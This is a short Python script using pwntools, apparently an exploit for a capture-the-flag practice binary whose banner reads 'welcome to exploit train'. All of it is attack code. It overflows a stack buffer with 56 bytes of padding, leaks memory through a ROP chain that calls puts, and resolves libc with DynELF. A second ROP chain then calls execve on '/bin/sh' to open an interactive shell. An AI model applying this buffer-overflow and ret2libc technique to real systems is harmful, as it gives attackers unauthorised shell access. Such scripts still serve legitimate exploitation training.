from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'

def leak(addr):
    t.recvuntil("welcome to exploit train\n**************************************\n")
    rop = ROP(binary)
    rop.puts(addr)
    rop.main()
    t.sendline('a'*56 + str(rop))
    data = t.recvuntil('**************************************\n')[:-40]
    if data == '':
        return '\x00'
    return data


binary = ELF('./bin')
t = process('./bin')

d = DynELF(leak, elf = binary)
libc = d.libc       #can work well with some libc
#system = d.lookup('system', 'libc')

sh = libc.search('/bin/sh').next()
t.recvuntil("welcome to exploit train\n**************************************\n")
rop = ROP(libc)
rop.execve(sh, 0, 0)
t.sendline('a'*56 + str(rop))
 
t.interactive()
